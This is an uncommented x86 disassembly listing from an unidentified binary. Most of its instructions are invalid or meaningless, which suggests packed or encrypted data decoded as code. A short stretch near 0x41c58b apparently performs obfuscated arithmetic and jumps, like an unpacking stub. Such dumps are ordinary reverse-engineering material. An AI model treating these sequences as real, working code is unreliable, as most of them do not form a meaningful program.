  41c4e2:	push   esp
  41c4e3:	jge    0x41c4b0
  41c4e5:	xchg   BYTE PTR [esi],ch
  41c4e7:	mov    edx,0x808ae8ba
  41c4ec:	fsubr  QWORD PTR [edi+0x70]
  41c4ef:	imul   esp,DWORD PTR [ecx],0xffffffd7
  41c4f2:	and    eax,0x99ec21c
  41c4f7:	inc    esi
  41c4f8:	je     0x41c567
  41c4fa:	pop    esi
  41c4fb:	add    eax,0x44737f14
  41c500:	or     eax,0xb44900c2
  41c505:	sub    eax,0x47198a35
  41c50a:	cmp    dh,BYTE PTR [eax]
  41c50c:	push   cs
  41c50d:	push   0x36
  41c50f:	or     DWORD PTR [ecx+0x7d],edi
  41c512:	rol    DWORD PTR [eax-0x72],0x74
  41c516:	xor    al,0xcd
  41c518:	enter  0x688f,0x48
  41c51c:	std    
  41c51d:	iret   
  41c51e:	cmc    
  41c51f:	adc    al,0x39
  41c521:	fs mov ebx,0xb4522171
  41c527:	(bad)  
  41c529:	iret   
  41c52a:	or     dh,al
  41c52c:	dec    ebp
  41c52d:	or     edi,DWORD PTR [edx]
  41c52f:	jns    0x41c5a5
  41c531:	in     al,dx
  41c532:	aaa    
  41c533:	push   ebx
  41c534:	pop    eax
  41c535:	inc    edi
  41c536:	fnstsw WORD PTR ds:0x55d6bb28
  41c53c:	pop    esp
  41c53d:	xchg   ebp,eax
  41c53e:	das    
  41c53f:	test   BYTE PTR ds:0xd68733ac,ch
  41c545:	js     0x41c4e1
  41c547:	fwait
  41c548:	push   ecx
  41c549:	cmp    bl,BYTE PTR [eax-0x2]
  41c54c:	mov    bl,0xc6
  41c54e:	sbb    ah,cl
  41c550:	add    ebx,DWORD PTR [edx]
  41c552:	sub    DWORD PTR [edi+0x6d],0xa7de2885
  41c559:	add    DWORD PTR [edi-0x5b],esi
  41c55c:	fwait
  41c55d:	push   ebp
  41c55e:	mov    ecx,0xce31b0c5
  41c563:	inc    eax
  41c564:	out    dx,al
  41c565:	adc    al,0xa6
  41c567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c568:	mov    al,0x6b
  41c56a:	dec    esi
  41c56b:	into   
  41c56c:	dec    BYTE PTR fs:[esi]
  41c56f:	stos   DWORD PTR es:[edi],eax
  41c570:	lds    esp,FWORD PTR [ebp-0x30740474]
  41c576:	int    0x82
  41c578:	jge    0x41c515
  41c57a:	retf   0xd1a8
  41c57d:	call   0x33cd:0xa4b3c4d8
  41c584:	enter  0xd033,0x2b
  41c588:	retf   0xce2b
  41c58b:	xor    ecx,eax
  41c58d:	mov    DWORD PTR [ebp+0x8],ecx
  41c590:	mov    ecx,DWORD PTR [ebp+0x8]
  41c593:	mov    edx,DWORD PTR [ebp+0x8]
  41c596:	xor    ecx,eax
  41c598:	imul   edx,edx,0x5708f2
  41c59e:	add    ecx,esi
  41c5a0:	lea    ecx,[ebp+ecx*4-0x64]
  41c5a4:	mov    edi,DWORD PTR [ecx]
  41c5a6:	add    edx,edi
  41c5a8:	mov    DWORD PTR [ecx],edx
  41c5aa:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ad:	xor    ecx,eax
  41c5af:	add    ecx,esi
  41c5b1:	jne    0x41a1f0
  41c5b7:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5ba:	mov    edx,DWORD PTR [ebp+0x8]
  41c5bd:	xor    ecx,eax
  41c5bf:	jmp    0x41e94c
  41c5c4:	js     0x41c5e5
  41c5c6:	pop    ebx
  41c5c7:	out    0xdb,eax
  41c5c9:	jnp    0x41c643
  41c5cb:	rep ins DWORD PTR es:[edi],dx
  41c5cd:	pop    ebx
  41c5ce:	jns    0x41c591
  41c5d0:	stos   DWORD PTR es:[edi],eax
  41c5d1:	cs push ecx
  41c5d3:	xor    edi,esi
  41c5d5:	loope  0x41c654
  41c5d7:	jp     0x41c5e3
  41c5d9:	pop    edi
  41c5da:	jp     0x41c656
  41c5dc:	imul   edi,DWORD PTR [esi-0x1e],0xd93e9cc8
  41c5e3:	icebp  
  41c5e4:	data16 cmc 
  41c5e6:	jne    0x41c5d3
  41c5e8:	xor    ebp,DWORD PTR [edi]
  41c5ea:	mov    bh,0xa7
  41c5ec:	cmc    
  41c5ed:	fwait
  41c5ee:	jb     0x41c61b
  41c5f0:	lds    ebp,FWORD PTR [ebx+edx*1-0x7cc0fb24]
  41c5f7:	and    ch,BYTE PTR [ebx]
  41c5f9:	mov    ecx,0xc7290a85
  41c5fe:	(bad)  
  41c5ff:	fimul  WORD PTR [esi-0x61]
  41c602:	xor    eax,esp
  41c604:	nop
  41c605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c606:	pop    ebp
  41c607:	or     eax,0xa2044303
  41c60c:	inc    esi
  41c60d:	sbb    ch,BYTE PTR [esi+0x7bfea001]
  41c613:	cli    
  41c614:	mov    edx,0x5ccd34fd
  41c619:	dec    edx
  41c61a:	(bad)  
  41c61b:	scas   eax,DWORD PTR es:[edi]
  41c61c:	test   cl,dl
  41c61e:	(bad)  
  41c61f:	scas   eax,DWORD PTR es:[edi]
  41c620:	dec    edi
  41c621:	hlt    
  41c622:	dec    esp
  41c623:	(bad)  
  41c624:	hlt    
  41c625:	jl     0x41c5aa
  41c627:	sti    
  41c628:	mov    esp,ebp
  41c62a:	sbb    al,0x7e
  41c62c:	add    eax,0xae40a2f1
  41c631:	aam    0x1
  41c633:	xchg   esp,eax
  41c634:	ret    0x1535
  41c637:	fist   WORD PTR [ecx+0xe55f973]
  41c63d:	jp     0x41c61a
  41c63f:	sub    esp,ecx
  41c641:	sbb    al,0xa5
  41c643:	jb     0x41c6bc
  41c645:	and    al,0x8a
  41c647:	pop    es
  41c648:	push   0xffffffb3
  41c64a:	outs   dx,BYTE PTR ds:[esi]
  41c64b:	jo     0x41c699
  41c64d:	cmp    BYTE PTR ds:0xc760f279,ah
  41c653:	div    al
  41c655:	sub    DWORD PTR [ecx+0x73],eax
  41c658:	cmc    
  41c659:	int3   
  41c65a:	mov    eax,ds:0x6e521b64
  41c65f:	mul    BYTE PTR [esi-0x2b963f32]
  41c665:	xchg   edx,eax
  41c666:	cdq    
  41c667:	push   ebp
  41c668:	repz cli 
  41c66a:	mov    al,ds:0xd4f0786a
  41c66f:	ffreep st(3)
  41c671:	xor    DWORD PTR [ecx+edx*8+0x58],esi
  41c675:	stc    
  41c676:	cmp    edi,DWORD PTR [edx]
  41c678:	pop    ss
  41c679:	imul   eax,DWORD PTR [edx+0x2507b78b],0x502d316c
  41c683:	fs jecxz 0x41c656
  41c686:	repnz push 0x7618b3c3
  41c68c:	(bad)  
  41c68d:	pop    ebx
  41c68e:	sub    eax,0x80a88749
  41c693:	push   ss
  41c694:	sbb    al,0xad
  41c696:	dec    edx
  41c697:	jl     0x41c64d
  41c699:	mov    dh,0xf
  41c69b:	addr16 mov al,0xd6
  41c69e:	sbb    DWORD PTR [edx],esi
  41c6a0:	adc    eax,0x51d509cd
  41c6a5:	add    eax,0x34596a6c
  41c6aa:	inc    esp
  41c6ab:	nop
  41c6ac:	(bad)  
  41c6ad:	sbb    eax,0x27e9d5c6
  41c6b2:	jp     0x41c68f
  41c6b4:	sbb    edi,DWORD PTR [eax]
  41c6b6:	sbb    al,0x4e
  41c6b8:	lock sbb BYTE PTR [ebx+0x231d254],ch
  41c6bf:	dec    edi
  41c6c0:	inc    ebp
  41c6c1:	sub    bh,al
  41c6c3:	push   es
  41c6c4:	jb     0x41c6ea
  41c6c6:	scas   eax,DWORD PTR es:[edi]
  41c6c7:	or     BYTE PTR [ecx-0x14],al
  41c6ca:	mov    dh,0xaa
  41c6cc:	add    dh,BYTE PTR [edx+edi*1]
  41c6cf:	adc    DWORD PTR [esi],ebx
  41c6d1:	ins    BYTE PTR es:[edi],dx
  41c6d2:	dec    esp
  41c6d3:	ja     0x41c65d
  41c6d5:	sbb    eax,0xbf0ce0b6
  41c6da:	sub    al,0x4f
  41c6dc:	mov    al,ds:0xe7ec4ddc
  41c6e1:	adc    ah,BYTE PTR [esi+ecx*4+0x4338750f]
  41c6e8:	retf   
  41c6e9:	and    al,dl
  41c6eb:	xor    DWORD PTR [edi+0x21],eax
  41c6ee:	xor    al,BYTE PTR [ecx+0x6]
  41c6f1:	xchg   ecx,eax
  41c6f2:	mov    ah,ch
  41c6f4:	inc    esp
  41c6f5:	lds    edi,FWORD PTR [ebx-0x4c]
  41c6f8:	or     ebp,DWORD PTR [eax+0x499a57e9]
  41c6fe:	jecxz  0x41c754
  41c700:	xchg   ecx,eax
  41c701:	leave  
  41c702:	sub    BYTE PTR [ecx],dh
  41c704:	aad    0x9f
  41c706:	and    esp,edx
  41c708:	int    0x5a
  41c70a:	pop    edi
  41c70b:	xchg   esp,eax
  41c70c:	push   cs
  41c70d:	(bad)  
  41c70e:	mov    ds:0x8f3cbd8c,al
  41c713:	jbe    0x41c6ad
  41c715:	ins    DWORD PTR es:[edi],dx
  41c716:	gs shl edi,0x8f
  41c71a:	cmc    
  41c71b:	mov    ah,0x34
  41c71d:	in     eax,dx
  41c71e:	or     BYTE PTR [esi-0x33],bh
  41c721:	ror    DWORD PTR [esi-0x6dd5b4b6],1
  41c727:	hlt    
  41c728:	pop    eax
  41c729:	add    DWORD PTR [ecx+0x189f1b11],eax
  41c72f:	push   0xfffffffe
  41c731:	mov    al,ds:0x9926c64e
  41c736:	cmp    ch,BYTE PTR [ecx+0x13]
  41c739:	sbb    DWORD PTR [eax],ebp
  41c73b:	mov    esi,0xa61ece14
  41c740:	cmc    
  41c741:	jo     0x41c72d
  41c743:	aas    
  41c744:	shl    BYTE PTR [ebp+0x46],1
  41c747:	test   BYTE PTR [eax],dh
  41c749:	retf   0x161e
  41c74c:	inc    ebp
  41c74d:	sbb    bh,BYTE PTR [ecx-0x39]
  41c750:	cmp    BYTE PTR [edi+0x9423808],ch
  41c756:	mov    dl,0xf5
  41c758:	or     DWORD PTR [edx],ecx
  41c75a:	mov    ah,0xec
  41c75c:	sub    DWORD PTR [esi],0xca782285
  41c762:	or     eax,0x11724f65
  41c767:	(bad)  
  41c768:	popf   
  41c769:	daa    
  41c76a:	xor    eax,0xf39eaca8
  41c76f:	sbb    DWORD PTR [ebx+0x29],edx
  41c772:	lahf   
  41c773:	mov    ds:0xfc8d1fa8,eax
  41c778:	cmc    
  41c779:	call   0x7968:0xb988192c
  41c780:	dec    edx
  41c781:	mov    ch,0x97
  41c783:	mov    ds:0x74fe9bb2,al
  41c788:	or     bl,bh
  41c78a:	jl     0x41c757
  41c78c:	push   cs
  41c78d:	cld    
  41c78e:	scas   eax,DWORD PTR es:[edi]
  41c78f:	aam    0xd5
  41c791:	or     eax,0xc3885493
  41c796:	(bad)  
  41c797:	jmp    0x41c739
  41c799:	out    0xa,eax
  41c79b:	sub    al,ch
  41c79d:	pop    es
  41c79e:	ins    BYTE PTR es:[edi],dx
  41c79f:	sbb    ebp,DWORD PTR [ebx]
  41c7a1:	hlt    
  41c7a2:	in     al,dx
  41c7a3:	js     0x41c804
  41c7a5:	sbb    DWORD PTR [ecx*1+0x49e4cd15],0x98a050cc
  41c7b0:	pop    esp
  41c7b1:	daa    
  41c7b2:	aam    0x9d
  41c7b4:	push   ds
  41c7b5:	mov    DWORD PTR [ebp+0x15],edi
  41c7b8:	out    0x30,eax
  41c7ba:	sub    edi,DWORD PTR [ebx+0x31089003]
  41c7c0:	push   eax
  41c7c1:	mov    BYTE PTR [ebp-0x18],dh
  41c7c4:	and    al,0xa4
  41c7c6:	ret    0x8663
  41c7c9:	cmp    eax,0x32f4d46f
  41c7ce:	xchg   ebx,eax
  41c7cf:	xchg   edi,eax
  41c7d0:	loopne 0x41c77d
  41c7d2:	pop    ebx
  41c7d3:	cmp    al,0xb2
  41c7d5:	(bad)  
  41c7d6:	jmp    0x411:0xa3af81b
  41c7dd:	repnz xor al,0xb6
  41c7e0:	pusha  
  41c7e1:	push   edi
  41c7e2:	sar    edx,cl
  41c7e4:	inc    esi
  41c7e5:	pop    ebp
  41c7e6:	pop    edi
  41c7e7:	in     al,dx
  41c7e8:	jo     0x41c7d6
  41c7ea:	sbb    edx,DWORD PTR [eax+0x622091e0]
  41c7f0:	out    dx,al
  41c7f1:	inc    esi
  41c7f2:	push   ebx
  41c7f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7f4:	hlt    
  41c7f5:	rcr    BYTE PTR [ecx+0x3471e2f6],0x7f
  41c7fc:	xchg   BYTE PTR [ecx+0x22],cl
  41c7ff:	pop    edi
  41c800:	dec    eax
  41c801:	ret    0xf05b
  41c804:	call   0x5568:0x8aaebbf0
  41c80b:	cmp    eax,0x97444d9f
  41c810:	push   ss
  41c811:	ret    0x7c93
  41c814:	dec    ebp
  41c815:	xor    ecx,DWORD PTR [ebx+0x586fedeb]
  41c81b:	(bad)  
  41c81d:	push   ss
  41c81e:	fucom  st(6)
  41c820:	sbb    eax,0x9ce9a09a
  41c825:	cmp    al,0xba
  41c827:	outs   dx,DWORD PTR ds:[esi]
  41c828:	scas   al,BYTE PTR es:[edi]
  41c829:	xor    edx,DWORD PTR ds:0x1173475
  41c82f:	lds    di,DWORD PTR [esi+0x4807bfce]
  41c836:	mov    edi,fs
  41c838:	jecxz  0x41c891
  41c83a:	cmp    DWORD PTR [ecx],esi
  41c83c:	sub    BYTE PTR [esi+0x63f3a269],0x79
  41c843:	and    bh,BYTE PTR [ecx-0x10de054f]
  41c849:	sar    eax,cl
  41c84b:	in     eax,0xe7
  41c84d:	cmp    bl,BYTE PTR [ecx]
  41c84f:	aas    
  41c850:	loope  0x41c7eb
  41c852:	xchg   edx,eax
  41c853:	mov    ecx,DWORD PTR [ebp+0x4f]
  41c856:	ins    DWORD PTR es:[edi],dx
  41c857:	inc    esp
  41c858:	push   esi
  41c859:	xchg   BYTE PTR [eax-0x42],al
  41c85c:	(bad)  
  41c85d:	lahf   
  41c85e:	lds    eax,FWORD PTR [esi+0x3b97d1ad]
  41c864:	fcomip st,st(1)
  41c866:	in     al,dx
  41c867:	cld    
  41c868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c869:	jmp    DWORD PTR [esi+0x41]
  41c86c:	jmp    0x41c881
  41c86e:	dec    esp
  41c86f:	pop    esp
  41c870:	inc    ebx
  41c871:	rcr    DWORD PTR [ebx],1
  41c873:	cmc    
  41c874:	jmp    0x74885846
  41c879:	dec    ecx
  41c87a:	mov    al,0x7b
  41c87c:	add    al,0xb8
  41c87e:	adc    al,0x34
  41c880:	xchg   DWORD PTR [ebp-0x35fecfda],ecx
  41c886:	addr16 inc eax
  41c888:	add    al,0xc4
  41c88a:	popa   
  41c88b:	or     al,0x1f
  41c88d:	bound  esp,QWORD PTR ds:0xcd14cf47
  41c893:	sbb    al,0x8a
  41c895:	sbb    al,0xce
  41c897:	xor    bl,cl
  41c899:	dec    esp
  41c89a:	les    edx,FWORD PTR [edi-0x3]
  41c89d:	repz jmp 0x3d0b:0xd5e880b4
  41c8a5:	pop    eax
  41c8a6:	jae    0x41c8d7
  41c8a8:	push   edi
  41c8a9:	sti    
  41c8aa:	out    0xb,al
  41c8ac:	push   ebx
  41c8ad:	sub    bh,BYTE PTR [edi+0x43]
  41c8b0:	xchg   ecx,eax
  41c8b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8b2:	adc    eax,DWORD PTR [esp+eax*2-0x75]
  41c8b6:	push   esp
  41c8b7:	lods   al,BYTE PTR ds:[esi]
  41c8b8:	xor    DWORD PTR [esi+0x31],eax
  41c8bb:	mov    ch,0x21
  41c8bd:	cmc    
  41c8be:	int    0x7e
  41c8c0:	push   ss
  41c8c1:	cmp    ch,cl
  41c8c3:	dec    ecx
  41c8c4:	stos   DWORD PTR es:[edi],eax
  41c8c5:	idiv   DWORD PTR [esi+0x385bf5b1]
  41c8cb:	mov    ebp,0x5b2b8691
  41c8d0:	stc    
  41c8d1:	dec    ebx
  41c8d2:	popa   
  41c8d3:	int3   
  41c8d4:	cmp    eax,DWORD PTR [eax+eax*2]
  41c8d7:	sbb    dl,BYTE PTR [esi]
  41c8d9:	pushf  
  41c8da:	lock in al,0x56
  41c8dd:	sub    al,0x2d
  41c8df:	or     al,0xea
  41c8e1:	scas   eax,DWORD PTR es:[edi]
  41c8e2:	mov    BYTE PTR [ebp+0x5c],al
  41c8e5:	test   bh,0xde
  41c8e8:	pop    edx
  41c8e9:	aaa    
  41c8ea:	mov    esp,esi
  41c8ec:	push   esi
  41c8ed:	sub    DWORD PTR [eax],0x2f
  41c8f0:	outs   dx,BYTE PTR ds:[esi]
  41c8f1:	mov    WORD PTR [esi],fs
  41c8f3:	pop    edi
  41c8f4:	jmp    0x41c88a
  41c8f6:	xchg   DWORD PTR [ecx-0x48],ecx
  41c8f9:	out    0xd0,al
  41c8fb:	mov    ds:0xa39c6482,al
  41c900:	xchg   esi,eax
  41c901:	mov    WORD PTR [ecx],ss
  41c903:	hlt    
  41c904:	call   0x784cfa5
  41c909:	pop    edx
  41c90a:	cmp    cl,al
  41c90c:	dec    ecx
  41c90d:	(bad)  
  41c90e:	pop    ds
  41c90f:	xor    al,dh
  41c911:	push   esi
  41c912:	sub    DWORD PTR [ebx-0xe4b17d5],0x8c8af672
  41c91c:	push   0x10ef0d21
  41c921:	fwait
  41c922:	xor    esi,edi
  41c924:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c925:	iret   
  41c926:	(bad)  
  41c927:	mov    esi,0x65ba6412
  41c92c:	mov    dh,BYTE PTR [ecx+edi*2]
  41c92f:	adc    BYTE PTR [esi+0x17],cl
  41c932:	sbb    BYTE PTR [edi-0x18],dh
  41c935:	les    ebx,FWORD PTR [ebx-0x4cfbadf4]
  41c93b:	adc    bh,BYTE PTR [esi-0x1d6ff5ad]
  41c941:	daa    
  41c942:	pop    es
  41c943:	into   
  41c944:	push   ss
  41c945:	mov    bh,0xbc
  41c947:	and    ebx,ebp
  41c949:	stc    
  41c94a:	push   ss
  41c94b:	dec    ebp
  41c94c:	mov    bh,0xfd
  41c94e:	mov    ds:0xef11f192,al
  41c953:	retf   0xd580
  41c956:	jecxz  0x41c8f4
  41c958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c95a:	push   esi
  41c95b:	retf   
  41c95c:	pushf  
  41c95d:	mov    cl,0x1b
  41c95f:	add    cl,dh
  41c961:	call   0x612:0xbdf8d430
  41c968:	fst    QWORD PTR [edx]
  41c96a:	(bad)  
  41c96c:	mov    edx,0x20c92a3c
  41c971:	pop    ds
  41c972:	(bad)  
  41c973:	sti    
  41c974:	xor    al,0x37
  41c976:	mov    ds:0xb168ca11,eax
  41c97b:	mov    cl,0x85
  41c97d:	add    eax,0xefd95812
  41c982:	mov    ds:0xfe2357ce,al
  41c987:	inc    ebx
  41c988:	inc    edx
  41c989:	mov    al,ds:0x47b189e1
  41c98e:	sub    BYTE PTR [eax],bh
  41c990:	test   ecx,ebp
  41c992:	inc    ecx
  41c993:	add    esp,DWORD PTR ds:0x74370b9b
  41c999:	mov    ebp,0x6fea49ec
  41c99e:	aad    0x8e
  41c9a0:	inc    eax
  41c9a1:	cmp    dh,BYTE PTR [eax-0x35656e96]
  41c9a7:	es dec edi
  41c9a9:	(bad)  
  41c9aa:	out    0x23,al
  41c9ac:	mov    edx,0xc9c4e1cf
  41c9b1:	sub    BYTE PTR [edx-0x936c130],ah
  41c9b7:	imul   ebx,DWORD PTR cs:0xd3452a5f,0xde09cf56
  41c9c2:	mov    cl,0xa3
  41c9c4:	xor    BYTE PTR [eax-0x568368b2],bh
  41c9ca:	lods   al,BYTE PTR ds:[esi]
  41c9cb:	cdq    
  41c9cc:	pop    esp
  41c9cd:	cmp    eax,0x1d33e779
  41c9d2:	add    edx,DWORD PTR [ecx-0x59]
  41c9d5:	out    dx,eax
  41c9d6:	ds push esp
  41c9d8:	sub    bh,BYTE PTR [edi+0x3da7dbfa]
  41c9de:	fs fs mov ch,0xe1
  41c9e2:	or     edx,0xffffffab
  41c9e5:	mov    eax,ds:0xeba31457
  41c9ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9eb:	pop    ecx
  41c9ec:	push   0x2d
  41c9ee:	out    0x54,al
  41c9f0:	adc    al,0xd3
  41c9f2:	addr16 push es
  41c9f4:	imul   edi,DWORD PTR [ebx-0x21],0xffffffb3
  41c9f8:	jge    0x41c9de
  41c9fa:	(bad)  
  41c9fb:	js     0x41c98e
  41c9fd:	push   ebx
  41c9fe:	cmp    edx,DWORD PTR [eax-0x72]
  41ca01:	or     BYTE PTR [eax-0x18],bh
  41ca04:	clc    
  41ca05:	inc    edx
  41ca06:	test   BYTE PTR [ebx],0xc1
  41ca09:	xchg   BYTE PTR [eax+0x26],dl
  41ca0c:	xchg   esi,eax
  41ca0d:	mov    eax,0xb8d22baf
  41ca12:	xchg   edi,eax
  41ca13:	aad    0x7
  41ca15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca16:	mov    DWORD PTR [ecx],esp
  41ca18:	lock out dx,al
  41ca1a:	mov    dh,0xd3
  41ca1c:	add    edi,DWORD PTR [eax+0x7d2e66b8]
  41ca22:	pop    edi
  41ca23:	cwde   
  41ca24:	arpl   WORD PTR [ebx+edi*1],si
  41ca27:	jecxz  0x41c9aa
  41ca29:	mov    esp,0x1cb8d12b
  41ca2e:	pop    esi
  41ca2f:	pop    esi
  41ca30:	xchg   esp,eax
  41ca31:	out    dx,eax
  41ca32:	retf   
  41ca33:	aas    
  41ca34:	mov    esp,0x7e67cf28
  41ca39:	dec    ebx
  41ca3a:	(bad)  
  41ca3b:	add    DWORD PTR [ecx+0x71],0xdf3839d3
  41ca42:	ret    
  41ca43:	out    0xbd,al
  41ca45:	xlat   BYTE PTR ds:[ebx]
  41ca46:	loop   0x41c9d4
  41ca48:	mov    esp,0x1934d33e
  41ca4d:	xchg   edx,eax
  41ca4e:	dec    edx
  41ca4f:	ins    BYTE PTR es:[edi],dx
  41ca50:	in     al,0xf3
  41ca52:	lods   eax,DWORD PTR ds:[esi]
  41ca53:	test   ah,bl
  41ca55:	ins    DWORD PTR es:[edi],dx
  41ca56:	xchg   edx,eax
  41ca57:	mov    dl,0x1b
  41ca59:	lahf   
  41ca5a:	mov    al,0xd2
  41ca5c:	add    bh,BYTE PTR [eax]
  41ca5e:	jl     0x41ca3c
  41ca60:	push   ebx
  41ca61:	inc    BYTE PTR [edx]
  41ca63:	push   ss
  41ca64:	jnp    0x41ca19
  41ca66:	ret    0xb6fe
  41ca69:	xor    esi,DWORD PTR [esi+0x20f089ca]
  41ca6f:	fldenv [edi+edi*4]
  41ca72:	cmp    edx,DWORD PTR [edx-0x4fd50c6f]
  41ca78:	rcr    BYTE PTR [esp+0x70],1
  41ca7c:	ror    BYTE PTR [eax],1
  41ca7e:	add    esp,DWORD PTR [ecx+ebp*4]
  41ca81:	je     0x41ca29
  41ca83:	xchg   esp,eax
  41ca84:	leave  
  41ca85:	scas   eax,DWORD PTR es:[edi]
  41ca86:	pushf  
  41ca87:	adc    edx,esp
  41ca89:	xchg   edi,eax
  41ca8a:	int    0xfb
  41ca8c:	jbe    0x41ca4b
  41ca8e:	jecxz  0x41ca96
  41ca90:	es and eax,0x3cdf07ca
  41ca96:	mov    ecx,0x960c3b0a
  41ca9b:	int3   
  41ca9c:	xchg   ebp,eax
  41ca9d:	int3   
  41ca9e:	xchg   esi,eax
  41ca9f:	xchg   ebp,eax
  41caa0:	mov    ss,WORD PTR [edi]
  41caa2:	mov    dl,0xda
  41caa4:	xchg   esp,eax
  41caa5:	sub    ecx,DWORD PTR [ebp+0x5b]
  41caa8:	imul   esi,DWORD PTR [ebx+0x20],0x8c6e6fa
  41caaf:	cs jb  0x41ca9e
  41cab2:	(bad)  
  41cab3:	lods   al,BYTE PTR ds:[esi]
  41cab4:	jp     0x41ca6b
  41cab6:	sbb    DWORD PTR ds:0x5b795a37,eax
  41cabc:	sahf   
  41cabd:	punpcklbw mm2,DWORD PTR [edx+0x394ca9a7]
  41cac4:	cs push cs
  41cac6:	jnp    0x41cb14
  41cac8:	(bad)  
  41cac9:	aaa    
  41caca:	mov    WORD PTR [ebx-0x34],gs
  41cacd:	sbb    ebx,esp
  41cacf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cad0:	sbb    esi,DWORD PTR [esi-0x59]
  41cad3:	mov    ?,esi
  41cad5:	push   eax
  41cad6:	cmp    DWORD PTR [eax-0x66014df1],ebx
  41cadc:	icebp  
  41cadd:	sub    eax,edi
  41cadf:	data16 or dh,bh
  41cae2:	jbe    0x41ca9a
  41cae4:	add    DWORD PTR [eax],esp
  41cae6:	out    dx,al
  41cae7:	sahf   
  41cae8:	sbb    eax,0xc88614e2
  41caed:	sbb    edi,DWORD PTR [ecx]
  41caef:	sbb    esp,DWORD PTR [eax-0x80]
  41caf2:	imul   ebx,DWORD PTR [edx+0x32b87641],0x54c2d02
  41cafc:	mov    ch,0xe0
  41cafe:	xor    BYTE PTR [edx-0x6c],0x83
  41cb02:	inc    edx
  41cb03:	xchg   BYTE PTR [ecx-0x72],ch
  41cb06:	ss pop eax
  41cb08:	xlat   BYTE PTR ds:[ebx]
  41cb09:	jle    0x41cac4
  41cb0b:	mov    edi,0x876063e3
  41cb10:	and    ah,BYTE PTR [esi+ecx*1-0x6300daba]
  41cb17:	mov    cl,0x2
  41cb19:	mov    eax,ds:0xf41da3c4
  41cb1e:	xor    ebp,ebx
  41cb20:	sub    al,0xf0
  41cb22:	sti    
  41cb23:	inc    ebp
  41cb24:	test   al,0xad
  41cb26:	cmp    al,0xd
  41cb28:	inc    ecx
  41cb29:	xor    al,0xb4
  41cb2b:	pop    eax
  41cb2c:	pop    eax
  41cb2d:	add    esp,ebx
  41cb2f:	add    BYTE PTR [esi-0x3e9ed452],0xe4
  41cb36:	mov    ebx,0xf053418d
  41cb3b:	gs jns 0x41cb00
  41cb3e:	fadd   st(1),st
  41cb40:	out    dx,al
  41cb41:	(bad)
  41cb46:	in     eax,0xdf
  41cb48:	or     eax,0xd39d93f6
  41cb4d:	mov    DWORD PTR [ecx+0x5db720a9],ecx
  41cb53:	mov    ds:0x7b4515aa,al
  41cb58:	rcl    BYTE PTR [edx-0x5834cd3c],1
  41cb5e:	push   esi
  41cb5f:	out    dx,al
  41cb60:	push   ds
  41cb61:	push   ebp
  41cb62:	and    eax,0xcd46148
  41cb67:	test   DWORD PTR [esi-0x3138b1bc],ebp
  41cb6d:	in     al,dx
  41cb6e:	mov    dh,0x68
  41cb70:	sbb    ebx,DWORD PTR [edi+0x5be4b121]
  41cb76:	fcom   DWORD PTR ss:[esi+edx*8+0xc769727]
  41cb7e:	mov    ds:0x546ea8ef,al
  41cb83:	pop    ss
  41cb84:	adc    BYTE PTR [edi-0x11],bh
  41cb87:	out    0x72,eax
  41cb89:	xchg   ecx,eax
  41cb8a:	jae    0x41cbc7
  41cb8c:	inc    edi
  41cb8d:	jp     0x41cc01
  41cb8f:	test   eax,0xcfa85126
  41cb94:	enter  0x857e,0x33
  41cb98:	mov    dh,0x63
  41cb9a:	fbld   TBYTE PTR [ebp-0x41]
  41cb9d:	inc    esi
  41cb9e:	cmp    ch,ch
  41cba0:	nop
  41cba1:	data16 int3 
  41cba3:	jmp    0x209a051e
  41cba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cba9:	ret    
  41cbaa:	(bad)  
  41cbab:	sub    dl,BYTE PTR [eax+0x56]
  41cbae:	fwait
  41cbaf:	(bad)  
  41cbb0:	jge    0x41cc11
  41cbb2:	xchg   esi,eax
  41cbb3:	dec    eax
  41cbb4:	adc    eax,0xbf61f931
  41cbb9:	cmp    eax,0xb8e47519
  41cbbe:	into   
  41cbbf:	xchg   edi,eax
  41cbc0:	test   DWORD PTR [ebp-0x18],ebx
  41cbc3:	mov    WORD PTR [ebx+0x76],gs
  41cbc6:	ins    DWORD PTR es:[edi],dx
  41cbc7:	(bad)  
  41cbc8:	mov    gs,WORD PTR [eax+ebx*4]
  41cbcb:	lods   eax,DWORD PTR ds:[esi]
  41cbcc:	xor    cl,BYTE PTR [edi]
  41cbce:	out    0x2e,al
  41cbd0:	xor    cl,ch
  41cbd2:	sub    eax,0x934f885b
  41cbd7:	fisub  DWORD PTR [edi-0x4edad9cc]
  41cbdd:	inc    edx
  41cbde:	aam    0xe5
  41cbe0:	inc    esi
  41cbe1:	push   0xffffffab
  41cbe3:	or     ch,ah
  41cbe5:	lods   al,BYTE PTR ds:[esi]
  41cbe6:	and    edx,ecx
  41cbe8:	in     al,0xc9
  41cbea:	mov    eax,0x356d1e2a
  41cbef:	mul    DWORD PTR [esi+0x27]
  41cbf2:	mov    eax,ds:0xc0f18f56
  41cbf7:	clc    
  41cbf8:	sahf   
  41cbf9:	pop    esp
  41cbfa:	leave  
  41cbfb:	iret   
  41cbfc:	fadd   DWORD PTR fs:[ecx-0x6e60a9c9]
  41cc03:	fs xchg ebp,eax
  41cc05:	jns    0x41cbca
  41cc07:	xchg   ecx,eax
  41cc08:	call   0xee13f2b3
  41cc0d:	fisttp QWORD PTR [eax-0x28]
  41cc10:	in     eax,0x72
  41cc12:	sti    
  41cc13:	rcr    DWORD PTR [edi+0x35],0xa1
  41cc17:	fcmovnbe st,st(7)
  41cc19:	es mov esi,0x857419b8
  41cc1f:	push   0xffffff84
  41cc21:	ins    BYTE PTR es:[edi],dx
  41cc22:	or     al,0x96
  41cc24:	cmp    al,0xd5
  41cc26:	fistp  DWORD PTR [eax]
  41cc28:	mov    cl,0x46
  41cc2a:	xchg   edi,eax
  41cc2b:	dec    esi
